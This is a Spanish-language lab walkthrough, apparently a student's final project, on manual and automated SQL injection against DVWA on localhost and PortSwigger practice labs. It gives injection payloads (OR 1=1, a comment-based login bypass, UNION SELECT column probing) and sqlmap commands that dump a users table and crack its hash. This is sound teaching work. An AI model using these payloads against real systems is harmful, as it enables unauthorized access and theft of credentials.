# 🧪 Procedimiento Completo y Replicable - SQL Injection Manual y Automatizada

Este documento contiene todos los pasos, herramientas, comandos y procedimientos utilizados para realizar demostracion de **inyección SQL manual y automatizada**, usando `Burp Suite`, `sqlmap`, `Firefox`, `DVWA` y `Docker` sobre Kali Linux.

---

## 🔧 ENTORNO: Kali Linux

Sistema base utilizado para realizar todas las pruebas. Las herramientas pueden funcionar también en otras distribuciones basadas en Debian con los ajustes adecuados.

---

## ✅ PASO 1: INSTALACIÓN Y CONFIGURACIÓN DE HERRAMIENTAS

### 1. Docker

```bash
sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker
docker --version
```

### 2. Firefox

```bash
sudo apt install firefox-esr -y
```

### 3. Burp Suite Community Edition

```bash
sudo apt install burpsuite -y
burpsuite
```

Configurar Firefox para proxy:
- Host: `127.0.0.1`
- Puerto: `8080`

### 4. sqlmap

```bash
sudo apt install sqlmap -y
sqlmap --version
```

### 5. DVWA (Damn Vulnerable Web Application)

```bash
sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

---

## 📘 PASO 2: CONFIGURACIÓN DE DVWA

1. Acceder a `http://localhost`
2. Crear base de datos (`Create / Reset Database`)
3. Login: `admin / password`
4. Ir a “DVWA Security” y seleccionar `Low`

---

## 🧪 PASO 3: EJERCICIOS Y FASES DE ATAQUE

### 🔹 Ejercicio 1: SQLi - Retrieve Hidden Data (PortSwigger)

1. Visitar `/filter?category=Gifts`
2. Interceptar y modificar parámetro en Burp Suite:
```sql
Gifts'+OR+1=1--
```
3. Validar visualización de productos ocultos

---

### 🔹 Ejercicio 2: Login Bypass (PortSwigger)

1. Enviar en login:
```
Usuario: administrator'--
Contraseña: cualquier valor
```
2. Validar acceso sin credenciales

---

### 🔹 Ejercicio 3: UNION SELECT – Column Discovery (PortSwigger)

1. Visitar:
```
/filter?category=Accessories
```
2. Probar payloads:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
3. Identificar el número correcto de columnas cuando no hay error

---

## 🔹 Ejercicio 4 Detallado: SQL Injection Automatizada con sqlmap (DVWA)

### 🐳 Preparación del Entorno

```bash
sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

- Acceder a `http://localhost`
- Crear DB → Login (`admin/password`) → Seguridad en Low

---

### 🧭 Fases del Ataque Automatizado

#### 1. Obtener PHPSESSID desde Firefox

- F12 → Storage → Cookies → Copiar valor

#### 2. Enumerar bases de datos

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=XYZ; security=low" --dbs
```

#### 3. Listar tablas de `dvwa`

```bash
sqlmap -u ... -D dvwa --tables
```

#### 4. Extraer tabla `users`

```bash
sqlmap -u ... -D dvwa -T users --dump
```

#### 5. Crackeo de hashes (responder `y`)

```
Hash: 5f4dcc3b5aa765d61d8327deb882cf99 → password
```

---

### 📁 Archivos generados por sqlmap

```bash
~/.local/share/sqlmap/output/localhost/
├── dump/
├── logs/
└── session files
```

---

## 🔧 HERRAMIENTAS ADICIONALES RECOMENDADAS

```bash
sudo apt install john -y
sudo apt install hash-identifier -y
sudo apt install nmap -y
sudo apt install wireshark -y
```

---

## 👤 Autor

**Cesar Ernesto Perdomo Guerrero**  
Proyecto Final SDR UDB - Seguridad de bases de datos Inyecciones SQL Manuales y Automatizadas
